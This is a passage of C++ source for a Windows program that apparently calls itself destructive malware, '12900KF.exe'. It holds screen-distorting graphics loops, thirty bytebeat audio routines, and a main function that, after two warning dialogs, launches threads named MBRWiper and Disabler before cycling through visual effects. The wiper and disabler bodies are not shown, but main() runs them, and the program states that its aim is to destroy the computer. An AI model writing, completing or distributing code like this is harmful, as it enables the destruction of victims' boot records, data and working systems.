	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb = rand();
		}
		BitBlt(hdcScreen, -2, 2, w, h, hdcMem, 4, 4, SRCERASE);
		Sleep(10);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
	return 0;
}

VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*(6+(((t>>18&1?t>>(t>>18&1?13:12)&3:0)^t>>(t>>18&1?14:13)&(-t>>(t>>18&1?15:14)&3?1:2))+3&3))/8%128+(t*(6+(t>>16&3))/16|t>>7^t>>9)%128);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t^t>>8)+t&128^t&t>>8&128);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((((t/10|0)^(t/10|0)-1280)%11*t/2&127)+(((t/640|0)^(t/640|0)-2)%13*t/2&127));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * t / (1 + (t >> 9 & t >> 8)) & 129);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t*(3+(4+(t>>12)%2)*(t>>10)%7)&128)*(.15+(t>>9)%2)/2);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 8 | t >> 9)) >> (t >> 19);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(15 * t & t * (t >> 10) / 6);
		
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 0) ^ (t >> 4) ^ (t >> 7));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t & 567) * (t >> 8) ^ t & t >> 8);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound10() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(((t >> 9 | t >> 11) % 7 * t * (~t >> 8 & 2) & 64) + ((t >> 9 | t >> 8) % 7 * t * (~t >> 8 & 2) & 64) + ((t >> 9 | t >> 12) % 7 * t * (~t >> 9 & 2) & 64));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound11() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t ^ (t >> 8) & t);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound12() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(10 * (t >> 6 | t >> ((t >> 7) & (t >> 11))));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound13() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (0x21CA52CA >> (t >> 9 & 30) & 12) + 
                                      t * (0xCACACACA >> (t >> 9 & 30) & 14) & t >> 4);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound14() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t & 4096 ? t % 65536 < 59392 ? 7 : t & 7 : 16) + 
                                           (1 & t >> 14)) >> (3 & t >> (t & 2048 ? 2 : 10)) | 
                                      t >> (t & 16384 ? t & 4096 ? 10 : 2 : 2));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound15() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 12 & 12 ^ 2 | t >> 9 & 9) | t >> 2 | 30000 / (t % 4096 + 1));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound16() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8300, 8300, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8300 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t>>9^(t>>9)-1^1)%13*t);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}


VOID WINAPI sound17() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8300, 8300, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8300 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 10 ^ t >> 12) % 5 * ((t >> 14 & 3 ^ t >> 15 & 1) + 1) * t % 100 + ((3 + (t >> 15 & 3) - (t >> 16 & 1)) / 3 * t % 98 & 67);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound18() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11325, 11325, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11325 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(5 * (t + (t ^ t >> 8) ^ 5));
		
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound19() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16300, 16300, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16300 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t * (3 + (4 + (t >> 14) % 2) * (t >> 10) % 7) & 128) * .5 * (.16 + (t >> 9) % 2));
		
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound20() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t<<4)^-(t>>4&1));
		
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound21() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8200, 8200, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8200 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t ? 47 : 3) * (t >> 7));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound22() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t * 2 | t >> 8));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound23() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t * 4 | t >> 8));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound24() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22350, 22350, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22350 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 12 & 3 & t >> 3));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound25() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t>>t%(t%2?t&32768?41:t&16384?51:61:34)&(t/9&t/7|t/5&t/3|t|t*3&t*5|t*7&t*9)>>4);
        
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound26() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t + t) >> 6) * tan((t + t) >> 6));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound27() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 3) * ((t >> 4) ^ (t >> 5)) & 255);
        
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound28() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 5) & (t * 8) ^ (t * 3));
        
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound29() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t % 2048) * (t % 2048)) >> 10);
        
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound30() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t * 255) & 0xFF);
		
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

int main() {
    if (MessageBoxW(NULL, L"The software you just executed is considered malware, it will harm your computer and makes it unuseable, run?!", L"12900KF.exe by VietNamLover", 
                    MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
    
    if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING! DO YOU REALLY WANT TO DESTROY THIS PC?! IF YOU REALLY WANT TO DESTROY THIS PC, PRESS THE YES BUTTON TO RUN THIS MALWARE!", 
                    L"12900KF.exe - LAST WARNING!", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
            CreateThread(0, 0, MBRWiper, 0, 0, 0);
            Sleep(1000);
			CreateThread(0, 0, Disabler, 0, 0, 0);
            Sleep(4000);
            HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);

            HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            InvalidateRect(0, 0, 0);

            HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);

            HANDLE thread4 = CreateThread(0, 0, shader4, 0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);

            HANDLE thread5 = CreateThread(0, 0, thing5, 0, 0, 0);
            HANDLE thread5dot1 = CreateThread(0, 0, cubes, 0, 0, 0);
            HANDLE thread5dot2 = CreateThread(0, 0, pacmans, 0, 0, 0);            
			HANDLE thread5dot3 = CreateThread(0, 0, textouts1, 0, 0, 0);
            sound5();
            Sleep(30000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            TerminateThread(thread5dot1, 0);
            CloseHandle(thread5dot1);
            TerminateThread(thread5dot2, 0);
            CloseHandle(thread5dot2);
            TerminateThread(thread5dot3, 0);
            CloseHandle(thread5dot3);
            InvalidateRect(0, 0, 0);

            HANDLE thread6 = CreateThread(0, 0, Verity, 0, 0, 0);
            HANDLE thread6dot1 = CreateThread(0, 0, textouts, 0, 0, 0);
            sound6();
            Sleep(30000);
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            TerminateThread(thread6dot1, 0);
            CloseHandle(thread6dot1);
            InvalidateRect(0, 0, 0);

            HANDLE thread7 = CreateThread(0, 0, shader5, 0, 0, 0);
            sound7();
            Sleep(30000);
            TerminateThread(thread7, 0);
            CloseHandle(thread7);
            InvalidateRect(0, 0, 0);

            HANDLE thread8 = CreateThread(0, 0, Verityy, 0, 0, 0);
            sound8();
            Sleep(30000);
            TerminateThread(thread8, 0);
            CloseHandle(thread8);
            InvalidateRect(0, 0, 0);

            HANDLE thread9 = CreateThread(0, 0, Geometrydashh, 0, 0, 0);
            sound9();
            Sleep(30000);
            TerminateThread(thread9, 0);
            CloseHandle(thread9);
            InvalidateRect(0, 0, 0);

			HANDLE thread10 = CreateThread(0, 0, dwnm, 0, 0, 0);
			sound10();
			Sleep(30000);
			TerminateThread(thread10, 0);
			CloseHandle(thread10);
			InvalidateRect(0, 0, 0);

            HANDLE thread11 = CreateThread(0, 0, i912900, 0, 0, 0);
            sound11();
            Sleep(30000);
            TerminateThread(thread11, 0);
            CloseHandle(thread11);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread12 = CreateThread(0, 0, jhjhh, 0, 0, 0);
            sound12(); 
			Sleep(30000);
            TerminateThread(thread12, 0); 
			CloseHandle(thread12);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread13 = CreateThread(0, 0, dfgvfh, 0, 0, 0);
            sound13(); 
			Sleep(30000);
            TerminateThread(thread13, 0); 
			CloseHandle(thread13);
            InvalidateRect(0, 0, 0);
        
            HANDLE thread14 = CreateThread(0, 0, dsfv, 0, 0, 0);
            HANDLE thread14dot1 = CreateThread(0, 0, textouts2, 0, 0, 0);
            sound14(); 
		    Sleep(30000);
            TerminateThread(thread14, 0); 
		    CloseHandle(thread14);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread15 = CreateThread(0, 0, IntelCorei912900, 0, 0, 0);
            sound15();
            Sleep(30000);
            TerminateThread(thread15, 0); 
		    CloseHandle(thread15);
            TerminateThread(thread14dot1, 0); 
		    CloseHandle(thread14dot1);
            InvalidateRect(0, 0, 0);
            
        	HANDLE thread16 = CreateThread(0, 0, sfvdhvhsv, 0, 0, 0);
        	HANDLE thread16dot1 = CreateThread(0, 0, Verityisheree, 0, 0, 0);
        	sound16();
			Sleep(30000);
            TerminateThread(thread16, 0);
            CloseHandle(thread16);
            InvalidateRect(0, 0, 0);
